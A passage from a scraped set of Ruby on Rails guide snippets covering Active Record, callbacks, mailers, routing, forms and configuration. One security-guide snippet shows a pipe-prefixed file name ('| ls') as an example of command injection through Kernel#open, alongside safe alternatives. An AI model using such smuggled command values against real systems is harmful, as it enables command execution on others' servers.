+to_s+ on all elements and joining them.\n#\n#   Blog.all.to_fs # => \"First PostSecond PostThird Post\"\n```\n\n----------------------------------------\n\nTITLE: Secure Alternatives to Kernel#open in Ruby\nDESCRIPTION: Shows safe alternatives to Kernel#open using File.open, IO.open, or URI#open which don't execute OS commands when provided with pipe characters.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/security.md#2025-04-23_snippet_58\n\nLANGUAGE: ruby\nCODE:\n```\nFile.open(\"| ls\") { |file| file.read }\n# doesn't execute `ls` command, just opens `| ls` file if it exists\n\nIO.open(0) { |file| file.read }\n# opens stdin. doesn't accept a String as the argument\n\nrequire \"open-uri\"\nURI(\"https://example.com\").open { |file| file.read }\n# opens the URI. `URI()` doesn't accept `| ls`\n```\n\n----------------------------------------\n\nTITLE: Configuring PostgreSQL Schema Dump Output in Rails 5\nDESCRIPTION: Configuration to control how PostgreSQL schemas are dumped when using db:structure:dump in Rails 5, specifically for applications using schema_search_path or other PostgreSQL extensions.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/upgrading_ruby_on_rails.md#2025-04-23_snippet_59\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.active_record.dump_schemas = :all\n```\n\n----------------------------------------\n\nTITLE: Relative URL Link in Email Template (ERB)\nDESCRIPTION: This snippet uses the welcome_path helper in a link_to call within an ERB template to create a relative URL. Not recommended for mailers because email clients do not understand relative paths; this contrasts with the absolute URL usage shown in a later snippet.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_mailer_basics.md#2025-04-23_snippet_17\n\nLANGUAGE: html+erb\nCODE:\n```\n<%= link_to 'welcome', welcome_path %>\n```\n\n----------------------------------------\n\nTITLE: Fixtures YAML with Composite Key (Omitted ID Column)\nDESCRIPTION: This snippet shows a YAML fixture file for a model with a composite primary key, where the ID column can be omitted if an `id` column also exists and is unique for all records. The `author_id` is populated using `ActiveRecord::FixtureSet.identify` to reference another fixture.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_composite_primary_keys.md#_snippet_18\n\nLANGUAGE: yml\nCODE:\n```\n# books.yml\nalices_adventure_in_wonderland:\n  author_id: <%= ActiveRecord::FixtureSet.identify(:lewis_carroll) %>\n  title: \"Alice's Adventures in Wonderland\"\n```\n\n----------------------------------------\n\nTITLE: Using Cookies in Rails Controllers\nDESCRIPTION: This snippet demonstrates how to access, set, and delete cookies in a Rails controller. It shows how to auto-fill form fields with cookie data, save data to a cookie, and delete a cookie.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_controller_overview.md#_snippet_19\n\nLANGUAGE: ruby\nCODE:\n```\nclass CommentsController < ApplicationController\n  def new\n    # Auto-fill the commenter's name if it has been stored in a cookie\n    @comment = Comment.new(author: cookies[:commenter_name])\n  end\n\n  def create\n    @comment = Comment.new(comment_params)\n    if @comment.save\n      if params[:remember_name]\n        # Save the commenter's name in a cookie.\n        cookies[:commenter_name] = @comment.author\n      else\n        # Delete cookie for the commenter's name, if any.\n        cookies.delete(:commenter_name)\n      end\n      redirect_to @comment.article\n    else\n      render action: \"new\"\n    end\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Iterate with Custom Start and Finish IDs using `find_each` in Ruby\nDESCRIPTION: This snippet demonstrates using both `:start` and `:finish` options to iterate through a specific range of customer IDs. This is useful for processing a subset of records. This example only sends newsletters to customers with IDs between 2000 and 10000 (inclusive).\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_46\n\nLANGUAGE: ruby\nCODE:\n```\nCustomer.find_each(start: 2000, finish: 10000) do |customer|\n  NewsMailer.weekly(customer).deliver_now\nend\n```\n\n----------------------------------------\n\nTITLE: Skipping `before_action` for Specific Actions in Rails\nDESCRIPTION: This snippet shows how to use `skip_before_action` to prevent a `before_action` callback from running for specific controller actions. In this case, the `require_login` callback is skipped for the `new` and `create` actions of the `LoginsController`, allowing users to access the login form even if they are not logged in.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_controller_overview.md#_snippet_38\n\nLANGUAGE: ruby\nCODE:\n```\nclass LoginsController < ApplicationController\n  skip_before_action :require_login, only: [:new, :create]\nend\n```\n\n----------------------------------------\n\nTITLE: Association Callbacks: before_add with limit check in Rails\nDESCRIPTION: This example shows how to use the `before_add` association callback to check a limit before adding a book to an author's collection. If the limit is reached, an error is added to the base errors and `throw(:abort)` is called, preventing the book from being added.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_callbacks.md#_snippet_34\n\nLANGUAGE: ruby\nCODE:\n```\nclass Author < ApplicationRecord\n  has_many :books, before_add: :check_limit\n\n  private\n    def check_limit(_book)\n      if books.count >= 5\n        errors.add(:base, \"Cannot add more than 5 books for this author\")\n        throw(:abort)\n      end\n    end\nend\n```\n\n----------------------------------------\n\nTITLE: Retrieving Specific Data from Multiple Tables in Rails\nDESCRIPTION: This Ruby code retrieves specific data from multiple tables using method chaining. It selects the book ID and title from the `books` table and the author's first name from the `authors` table, joining them based on the `author_id`, and finds the record where the book title matches the specified title.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_183\n\nLANGUAGE: ruby\nCODE:\n```\nBook\n  .select(\"books.id, books.title, authors.first_name\")\n  .joins(:author)\n  .find_by(title: \"Abstraction and Specification in Program Development\")\n```\n\n----------------------------------------\n\nTITLE: Action Cable Connection Setup in Ruby\nDESCRIPTION: This code snippet demonstrates how to set up an Action Cable connection in Ruby. It defines a `Connection` class within the `ApplicationCable` module, inheriting from `ActionCable::Connection::Base`. It identifies the connection by the `current_user` and verifies the user based on an encrypted cookie.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_cable_overview.md#_snippet_0\n\nLANGUAGE: Ruby\nCODE:\n```\n# app/channels/application_cable/connection.rb\nmodule ApplicationCable\n  class Connection < ActionCable::Connection::Base\n    identified_by :current_user\n\n    def connect\n      self.current_user = find_verified_user\n    end\n\n    private\n      def find_verified_user\n        if verified_user = User.find_by(id: cookies.encrypted[:user_id])\n          verified_user\n        else\n          reject_unauthorized_connection\n        end\n      end\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Using after_save_commit for Create and Update in Rails\nDESCRIPTION: This code demonstrates the recommended approach of using `after_save_commit` when a callback needs to be executed after both create and update operations.  `after_save_commit` is an alias for `after_commit` that encompasses both scenarios, ensuring the callback is triggered consistently for both create and update events after the transaction has been committed.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_callbacks.md#_snippet_43\n\nLANGUAGE: ruby\nCODE:\n```\nclass User < ApplicationRecord\n  after_save_commit :log_user_saved_to_db\n\n  private\n    def log_user_saved_to_db\n      Rails.logger.info(\"User was saved to database\")\n    end\nend\n```\n\n----------------------------------------\n\nTITLE: Using token_list (class_names) Helper in Rails\nDESCRIPTION: The token_list helper returns a string of tokens built from provided arguments. It's also aliased as class_names and is useful for conditionally building CSS class names based on variables or conditions.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_view_helpers.md#2025-04-23_snippet_40\n\nLANGUAGE: ruby\nCODE:\n```\ntoken_list(\"cats\", \"dogs\")\n# => \"cats dogs\"\n\ntoken_list(nil, false, 123, \"\", \"foo\", { bar: true })\n# => \"123 foo bar\"\n\nmobile, alignment = true, \"center\"\ntoken_list(\"flex items-#{alignment}\", \"flex-col\": mobile)\n# => \"flex items-center flex-col\"\nclass_names(\"flex items-#{alignment}\", \"flex-col\": mobile) # using the alias\n# => \"flex items-center flex-col\"\n```\n\n----------------------------------------\n\nTITLE: Defining Attachment Variants on has_one_attached Association (Ruby)\nDESCRIPTION: Shows how to define named variants (e.g., thumb) for a file attachment using the variant method in has_one_attached. Variants process images to specified sizes, useful for thumbnails or previews. Depends on Active Storage variants support and a compatible image processing backend (e.g., mini_magick).\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_storage_overview.md#2025-04-23_snippet_20\n\nLANGUAGE: ruby\nCODE:\n```\nclass User < ApplicationRecord\n  has_one_attached :avatar do |attachable|\n    attachable.variant :thumb, resize_to_limit: [100, 100]\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Extracting Options from Array Arguments (Ruby)\nDESCRIPTION: This snippet demonstrates the use of `extract_options!` to extract an options hash from the end of an array of arguments.  The `caches_action` method showcases how to receive an arbitrary number of action names followed by an optional hash of options.  `extract_options!` retrieves this hash, removing it from the `actions` array.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_123\n\nLANGUAGE: ruby\nCODE:\n```\ndef caches_action(*actions)\n  return unless cache_configured?\n  options = actions.extract_options!\n  # ...\nend\n```\n\n----------------------------------------\n\nTITLE: Generating Stylesheet Link Tags with stylesheet_link_tag Helper in Ruby\nDESCRIPTION: Shows the `stylesheet_link_tag` helper from Action View's AssetTagHelper. It generates HTML `<link rel=\"stylesheet\">` tags for including CSS files, typically from `app/assets/stylesheets`. Examples demonstrate basic usage (automatically appending `.css`) and adding attributes like `media`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_view_helpers.md#2025-04-23_snippet_35\n\nLANGUAGE: ruby\nCODE:\n```\nstylesheet_link_tag(\"application\")\n# => <link href=\"/assets/application.css\" rel=\"stylesheet\" />\n```\n\nLANGUAGE: ruby\nCODE:\n```\nstylesheet_link_tag(\"application\", media: \"all\")\n```\n\n----------------------------------------\n\nTITLE: Interactive Console Example Showing Duplicate Records in has_many through Association\nDESCRIPTION: Shows an IRB console session demonstrating how a has_many through association can contain duplicate records when the same article is added twice to a person's articles collection.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_129\n\nLANGUAGE: ruby\nCODE:\n```\nirb> person = Person.create(name: 'John')\nirb> article = Article.create(name: 'a1')\nirb> person.articles << article\nirb> person.articles << article\nirb> person.articles.to_a\n=> [#<Article id: 5, name: \"a1\">, #<Article id: 5, name: \"a1\">]\nirb> Reading.all.to_a\n=> [#<Reading id: 12, person_id: 5, article_id: 5>, #<Reading id: 13, person_id: 5, article_id: 5>]\n```\n\n----------------------------------------\n\nTITLE: Suppressing Saving using ActiveRecord::Suppressor in Rails\nDESCRIPTION: This example demonstrates how to prevent the saving of records during the execution of a block of code using `ActiveRecord::Suppressor`.  This can be useful for skipping the creation or updating of associated records within a callback, allowing for fine-grained control over when data is persisted.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_callbacks.md#_snippet_32\n\nLANGUAGE: ruby\nCODE:\n```\nclass User < ApplicationRecord\n  has_many :notifications\n\n  after_create :create_welcome_notification\n\n  def create_welcome_notification\n    notifications.create(event: \"sign_up\")\n  end\nend\n\nclass Notification < ApplicationRecord\n  belongs_to :user\nend\n```\n\nLANGUAGE: ruby\nCODE:\n```\nNotification.suppress do\n  User.create(name: \"Jane\", email: \"jane@example.com\")\nend\n```\n\n----------------------------------------\n\nTITLE: Default Layout for Action Mailer (HTML ERB)\nDESCRIPTION: Sample mailer layout defined as mailer.html.erb, using HTML structure and Ruby ERB tags. This layout provides the base structure for all mailer views with support for inline email CSS styles and a yield statement for injecting mailer content.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_mailer_basics.md#2025-04-23_snippet_25\n\nLANGUAGE: html\nCODE:\n```\n<!DOCTYPE html>\n<html>\n  <head>\n    <meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\">\n    <style>\n      /* Email styles need to be inline */\n    </style>\n  </head>\n\n  <body>\n    <%= yield %>\n  </body>\n</html>\n```\n\n----------------------------------------\n\nTITLE: Testing View Partials - Ruby\nDESCRIPTION: This code shows how to test view partials by rendering a partial and then asserting that the rendered content includes a specific value. It creates an `Article` object, renders the `articles/article` partial with the article, and checks if the rendered output includes the article's title. Relies on ActionView::TestCase.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_90\n\nLANGUAGE: ruby\nCODE:\n```\nclass ArticlePartialTest < ActionView::TestCase\n  test \"renders a link to itself\" do\n    article = Article.create! title: \"Hello, world\"\n\n    render \"articles/article\", article: article\n\n    assert_includes rendered, article.title\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Using a Class for `around_action` in Rails\nDESCRIPTION: This snippet demonstrates how to use a class as an `around_action` callback. The class must implement a method with the same name as the callback (in this case, `around`). The method receives the controller as an argument and must `yield` to execute the action.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_controller_overview.md#_snippet_41\n\nLANGUAGE: ruby\nCODE:\n```\nclass ApplicationController < ActionController::Base\n  around_action ActionDurationCallback\nend\n\nclass ActionDurationCallback\n  def self.around(controller)\n    start_time = Time.now\n    yield # This executes the action\n    end_time = Time.now\n\n    duration = end_time - start_time\n    Rails.logger.info \"Action #{controller.action_name} from controller #{controller.controller_name} took #{duration.round(2)} seconds to execute.\"\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Setting I18n fallbacks for specific locales in Rails\nDESCRIPTION: Configures I18n fallbacks for specific locales using a hash.  For example, `:tr` is used as the fallback for `:az`, and `[:de, :en]` are used as fallbacks for `:da`. If a translation is missing in `:az`, it checks `:tr`.  If it's missing in `:da`, it checks `:de` then `:en`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_29\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.i18n.fallbacks = { az: :tr, da: [:de, :en] }\n#or\nconfig.i18n.fallbacks.map = { az: :tr, da: [:de, :en] }\n```\n\n----------------------------------------\n\nTITLE: Ordinalizing Integers in Ruby\nDESCRIPTION: This snippet demonstrates the `ordinalize` method, which extends the Integer class to return the ordinal string representation of an integer.  The method converts numbers like 1 to \"1st\", 2 to \"2nd\", and so on. It's defined in `active_support/core_ext/integer/inflections.rb`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_107\n\nLANGUAGE: ruby\nCODE:\n```\n1.ordinalize    # => \"1st\"\n2.ordinalize    # => \"2nd\"\n53.ordinalize   # => \"53rd\"\n2009.ordinalize # => \"2009th\"\n-21.ordinalize  # => \"-21st\"\n-134.ordinalize # => \"-134th\"\n```\n\n----------------------------------------\n\nTITLE: Checking if DateTime is in UTC in Ruby\nDESCRIPTION: This snippet demonstrates how to use the `utc?` predicate method to determine if a DateTime object represents a time in the UTC time zone. It returns `true` if the DateTime object is in UTC, and `false` otherwise. The example shows that converting a DateTime to UTC using the `utc` method will result in `utc?` returning `true`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_161\n\nLANGUAGE: ruby\nCODE:\n```\nnow = DateTime.now # => Mon, 07 Jun 2010 19:30:47 -0400\nnow.utc?           # => false\nnow.utc.utc?       # => true\n```\n\n----------------------------------------\n\nTITLE: Defining Routing Concerns\nDESCRIPTION: This snippet illustrates how to define reusable routing concerns using the `concern` block.  It defines two concerns: `:commentable` (which adds `comments` routes) and `:image_attachable` (which adds an `index` route for `images`). Concerns encapsulate common route definitions that can be included in multiple resources.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/routing.md#_snippet_18\n\nLANGUAGE: ruby\nCODE:\n```\nconcern :commentable do\n  resources :comments\nend\n\nconcern :image_attachable do\n  resources :images, only: :index\nend\n```\n\n----------------------------------------\n\nTITLE: Querying Records with Conditions and Ordering in Ruby\nDESCRIPTION: Finds all 'Book' records where the author attribute matches \"Douglas Adams\" and sorts the results by the 'created_at' timestamp in descending (reverse chronological) order. This utilizes the `where` method for filtering and the `order` method for sorting in Active Record.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_basics.md#2025-04-23_snippet_10\n\nLANGUAGE: ruby\nCODE:\n```\n# Find all books by a given author, sort by created_at in reverse chronological order.\nBook.where(author: \"Douglas Adams\").order(created_at: :desc)\n```\n\n----------------------------------------\n\nTITLE: Create Action Cable Subscriber JavaScript\nDESCRIPTION: This JavaScript code creates a subscription to a given channel using the consumer.subscriptions.create method. It imports the consumer and then creates subscriptions to \"ChatChannel\" with a room parameter and \"AppearanceChannel\" without additional parameters. These subscriptions enable the consumer to receive data from the specified channels.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_cable_overview.md#_snippet_10\n\nLANGUAGE: JavaScript\nCODE:\n```\n// app/javascript/channels/chat_channel.js\nimport consumer from \"./consumer\"\n\nconsumer.subscriptions.create({ channel: \"ChatChannel\", room: \"Best Room\" })\n\n// app/javascript/channels/appearance_channel.js\nimport consumer from \"./consumer\"\n\nconsumer.subscriptions.create({ channel: \"AppearanceChannel\" })\n```\n\n----------------------------------------\n\nTITLE: Converting Array to String (Ruby)\nDESCRIPTION: This snippet demonstrates the `to_fs` method, which converts an array to a string. By default, it behaves like `to_s`. When the `:db` symbol is passed, it converts an array of objects responding to `id` to a comma-separated string of their IDs. An empty array returns \"null\".\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_125\n\nLANGUAGE: ruby\nCODE:\n```\n[].to_fs(:db)            # => \"null\"\n[user].to_fs(:db)        # => \"8456\"\ninvoice.lines.to_fs(:db) # => \"23,567,556,12\"\n```\n\n----------------------------------------\n\nTITLE: Using Checkbox Tag Helper in Rails (ERB)\nDESCRIPTION: This example illustrates how to use the `checkbox_tag` helper in Rails to render a checkbox outside of a form builder context. It allows generating form elements directly without relying on a form object.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/form_helpers.md#_snippet_89\n\nLANGUAGE: erb\nCODE:\n```\n<%= checkbox_tag \"accept\" %>\n```\n\n----------------------------------------\n\nTITLE: Generating a System Test Skeleton (Bash)\nDESCRIPTION: This command generates a system test file within the `test/system` directory, providing a basic structure for writing system tests in Rails. It uses the `rails generate system_test` command with the name of the test as an argument.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_58\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails generate system_test users\n      invoke test_unit\n      create test/system/users_test.rb\n```\n\n----------------------------------------\n\nTITLE: Building Active Record PostgreSQL Test Database in Bash\nDESCRIPTION: Navigates to the `activerecord` directory and executes a Rake task (`db:postgresql:build`) to create the necessary database schema and user for running Active Record tests against PostgreSQL. Requires PostgreSQL server configured as per `activerecord/test/config.example.yml`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/contributing_to_ruby_on_rails.md#2025-04-23_snippet_23\n\nLANGUAGE: bash\nCODE:\n```\n$ cd activerecord\n$ bundle exec rake db:postgresql:build\n```\n\n----------------------------------------\n\nTITLE: Strip Heredoc\nDESCRIPTION: This snippet demonstrates stripping the indentation from a heredoc string, aligning the text against the left margin. It removes the minimum indentation found across all lines.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_54\n\nLANGUAGE: ruby\nCODE:\n```\nif options[:usage]\n  puts <<-USAGE.strip_heredoc\n    This command does such and such.\n\n    Supported options are:\n      -h         This message\n      ...\n  USAGE\nend\n```\n\n----------------------------------------\n\nTITLE: Marking a String as HTML Safe with html_safe\nDESCRIPTION: This Ruby code shows how to mark a string as HTML safe using the `html_safe` method. This method does not perform any escaping; it simply asserts that the string is safe to be inserted into HTML as is. It's important to ensure that the string is indeed safe before calling `html_safe`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_35\n\nLANGUAGE: ruby\nCODE:\n```\ns = \"\".html_safe\ns.html_safe? # => true\n```\n\n----------------------------------------\n\nTITLE: Listing Unused Routes (bash)\nDESCRIPTION: Demonstrates using the `--unused` option with `bin/rails routes` to identify routes that are defined in `config/routes.rb` but not referenced in any controller action or view.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/routing.md#_snippet_85\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails routes --unused\n```\n\n----------------------------------------\n\nTITLE: Checking if a Has and Belongs to Many Collection is Empty in Rails Views\nDESCRIPTION: Example of using the empty? method in a view to check if a part is used in any assemblies, showing conditional rendering based on association status.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_53\n\nLANGUAGE: html+erb\nCODE:\n```\n<% if @part.assemblies.empty? %>\n  This part is not used in any assemblies\n<% end %>\n```\n\n----------------------------------------\n\nTITLE: Wrapping Application Code with Rails Reloader (Ruby)\nDESCRIPTION: Shows how to use the Rails Reloader to wrap application code, ensuring that code reloads as necessary before execution and always invokes Executor context internally. This is suitable for long-running frameworks or servers repeatedly invoking application code but is rarely needed in application code itself. The Reloader checks for pending reloads before executing the given block.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/threading_and_code_execution.md#2025-04-23_snippet_3\n\nLANGUAGE: ruby\nCODE:\n```\nRails.application.reloader.wrap do\n  # call application code here\nend\n```\n\n----------------------------------------\n\nTITLE: Creating Custom Event Instrumentation\nDESCRIPTION: Example showing how to create and subscribe to custom instrumentation events using ActiveSupport::Notifications.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_instrumentation.md#2025-04-23_snippet_33\n\nLANGUAGE: ruby\nCODE:\n```\nActiveSupport::Notifications.instrument \"my.custom.event\", this: :data do\n  # do your custom stuff here\nend\n```\n\n----------------------------------------\n\nTITLE: Association Conditions with Proc\nDESCRIPTION: Demonstrates the updated syntax for using conditions in associations using procs instead of interpolated strings\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/3_1_release_notes.md#2025-04-23_snippet_18\n\nLANGUAGE: ruby\nCODE:\n```\nhas_many :things, :conditions => proc { [\"foo = ?\", bar] }\n```\n\n----------------------------------------\n\nTITLE: Basic Association Structure with Second-order Relationships in Ruby on Rails\nDESCRIPTION: Demonstrates a basic model structure with three classes (Supplier, Account, Representative) showing first and second-order associations. This establishes the foundation for the includes example.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_119\n\nLANGUAGE: ruby\nCODE:\n```\nclass Supplier < ApplicationRecord\n  has_one :account\nend\n\nclass Account < ApplicationRecord\n  belongs_to :supplier\n  belongs_to :representative\nend\n\nclass Representative < ApplicationRecord\n  has_many :accounts\nend\n```\n\n----------------------------------------\n\nTITLE: Interval Type in PostgreSQL\nDESCRIPTION: Demonstrates usage of PostgreSQL interval type with ActiveSupport::Duration in Rails.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_postgresql.md#2025-04-23_snippet_10\n\nLANGUAGE: ruby\nCODE:\n```\n# db/migrate/20200120000000_create_events.rb\ncreate_table :events do |t|\n  t.interval \"duration\"\nend\n```\n\nLANGUAGE: ruby\nCODE:\n```\n# app/models/event.rb\nclass Event < ApplicationRecord\nend\n```\n\nLANGUAGE: irb\nCODE:\n```\nirb> Event.create(duration: 2.days)\n\nirb> event = Event.first\nirb> event.duration\n=> 2 days\n```\n\n----------------------------------------\n\nTITLE: Enabling HSTS with Subdomains in SSL Options\nDESCRIPTION: Configuration to enable HTTP Strict Transport Security (HSTS) with subdomain support in Rails 5, enhancing security by enforcing HTTPS across all subdomains.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/upgrading_ruby_on_rails.md#2025-04-23_snippet_60\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.ssl_options = { hsts: { subdomains: true } }\n```\n\n----------------------------------------\n\nTITLE: Running Tests Starting at a Specific Line in Bash (Railties)\nDESCRIPTION: Executes tests within a specific file (`test/application/asset_debugging_test.rb`) starting from the test defined at or after the specified line number (69). This is an alternative to using the test name.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/contributing_to_ruby_on_rails.md#2025-04-23_snippet_17\n\nLANGUAGE: bash\nCODE:\n```\n$ cd railties\n$ bin/test test/application/asset_debugging_test.rb:69\n```\n\n----------------------------------------\n\nTITLE: New Product HTML Form\nDESCRIPTION: The HTML output of the `form_with` helper in the `new.html.erb` view.  It includes the CSRF token, label, text input, and submit button.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_55\n\nLANGUAGE: html\nCODE:\n```\n<form action=\"/products\" accept-charset=\"UTF-8\" method=\"post\">\n  <input type=\"hidden\" name=\"authenticity_token\" value=\"UHQSKXCaFqy_aoK760zpSMUPy6TMnsLNgbPMABwN1zpW-Jx6k-2mISiF0ulZOINmfxPdg5xMyZqdxSW1UK-H-Q\" autocomplete=\"off\">\n\n  <div>\n    <label for=\"product_name\">Name</label>\n    <input type=\"text\" name=\"product[name]\" id=\"product_name\">\n  </div>\n\n  <div>\n    <input type=\"submit\" name=\"commit\" value=\"Create Product\" data-disable-with=\"Create Product\">\n  </div>\n</form>\n```\n\n----------------------------------------\n\nTITLE: Auto Discovery Link Tag (Rails/ERB)\nDESCRIPTION: This example demonstrates how to create an auto-discovery link tag for an RSS feed. The first argument specifies the type of feed, the second defines the URL options, and the third defines tag options.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/layouts_and_rendering.md#_snippet_41\n\nLANGUAGE: erb\nCODE:\n```\n<%= auto_discovery_link_tag(:rss, {action: \"feed\"},\n  {title: \"RSS Feed\"}) %>\n```\n\n----------------------------------------\n\nTITLE: Using Rails.error.handle with Fallback in Ruby\nDESCRIPTION: Demonstrates the use of Rails.error.handle with a fallback option. If an error occurs, the fallback lambda is executed, providing a default value or behavior.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/error_reporting.md#2025-04-23_snippet_3\n\nLANGUAGE: ruby\nCODE:\n```\nuser = Rails.error.handle(fallback: -> { User.anonymous }) do\n  User.find(params[:id])\nend\n```\n\n----------------------------------------\n\nTITLE: Running Tests with Error (Bash)\nDESCRIPTION: This displays the output in the console from running the tests, when there's an error.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_13\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails test test/models/article_test.rb\nRunning 2 tests in a single process (parallelization threshold is 50)\nRun options: --seed 1808\n```\n\n----------------------------------------\n\nTITLE: Configuring Action Mailbox Logger\nDESCRIPTION: Shows how to configure the logger used by Action Mailbox to a custom logger instance. This allows for directing Action Mailbox logs to a specific location or using a custom logging format. The example uses `ActiveSupport::Logger` to log to standard output.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_56\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.action_mailbox.logger = ActiveSupport::Logger.new(STDOUT)\n```\n\n----------------------------------------\n\nTITLE: Special Formatting Helpers in Rails Forms\nDESCRIPTION: This snippet demonstrates how to use helpers for fields with special formatting, like password, email, telephone, and URL in Rails forms. These helpers generate corresponding HTML input elements with appropriate type attributes and are often styled or validated differently by browsers.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/form_helpers.md#_snippet_11\n\nLANGUAGE: erb\nCODE:\n```\n<%= form.password_field :password %>\n<%= form.email_field :address %>\n<%= form.telephone_field :phone %>\n<%= form.url_field :homepage %>\n```\n\n----------------------------------------\n\nTITLE: Updating Multiple Records Directly in Ruby without Callbacks/Validations\nDESCRIPTION: Updates the 'status' attribute to \"already own\" for all records in the 'Book' table using the `update_all` class method. This method executes a single SQL UPDATE statement directly, bypassing Active Record callbacks and validations for performance gains when updating in bulk.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_basics.md#2025-04-23_snippet_15\n\nLANGUAGE: ruby\nCODE:\n```\nBook.update_all(status: \"already own\")\n```\n\n----------------------------------------\n\nTITLE: Demonstrating Presence Validation Behavior in IRB (Ruby)\nDESCRIPTION: Shows IRB examples of how the `presence` validator defined in the `Person` model works. A `Person` instance with all required fields populated is valid, while one with a blank `name` and nil `login` is invalid.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_validations.md#2025-04-23_snippet_29\n\nLANGUAGE: irb\nCODE:\n```\nperson = Person.new(name: \"Alice\", login: \"alice123\", email: \"alice@example.com\")\nperson.valid?\n=> true # presence validation passes\n\ninvalid_person = Person.new(name: \"\", login: nil, email: \"bob@example.com\")\ninvalid_person.valid?\n=> false # presence validation fails\n```\n\n----------------------------------------\n\nTITLE: Defining YAML Translations for Active Record Models in Rails\nDESCRIPTION: This YAML snippet demonstrates how to define translations for model names and attributes in Rails. It includes examples for singular and plural forms of model names, as well as nested attribute translations.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/i18n.md#2025-04-23_snippet_38\n\nLANGUAGE: yaml\nCODE:\n```\nen:\n  activerecord:\n    models:\n      user: Customer\n    attributes:\n      user:\n        login: \"Handle\"\n      # will translate User attribute \"login\" as \"Handle\"\n\nen:\n  activerecord:\n    models:\n      user:\n        one: Customer\n        other: Customers\n\nen:\n  activerecord:\n    attributes:\n      user/role:\n        admin: \"Admin\"\n        contributor: \"Contributor\"\n```\n\n----------------------------------------\n\nTITLE: Using before_action Callbacks in Rails Mailers\nDESCRIPTION: Shows implementation of before_action callbacks to set instance variables and default mail settings in a mailer class.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_mailer_basics.md#2025-04-23_snippet_33\n\nLANGUAGE: ruby\nCODE:\n```\nclass InvitationsMailer < ApplicationMailer\n  before_action :set_inviter_and_invitee\n  before_action { @account = params[:inviter].account }\n\n  default to:       -> { @invitee.email_address },\n          from:     -> { common_address(@inviter) },\n          reply_to: -> { @inviter.email_address_with_name }\n\n  def account_invitation\n    mail subject: \"#{@inviter.name} invited you to their Basecamp (#{@account.name})\"\n  end\n\n  def project_invitation\n    @project    = params[:project]\n    @summarizer = ProjectInvitationSummarizer.new(@project.bucket)\n\n    mail subject: \"#{@inviter.name.familiar} added you to a project in Basecamp (#{@account.name})\"\n  end\n\n  private\n    def set_inviter_and_invitee\n      @inviter = params[:inviter]\n      @invitee = params[:invitee]\n    end\nend\n```\n\n----------------------------------------\n\nTITLE: Using the Uniqueness Validator with Conditions (Ruby)\nDESCRIPTION: Illustrates how to use the `:conditions` option with the `uniqueness` validator. It accepts a lambda returning an `ActiveRecord::Relation` (e.g., using 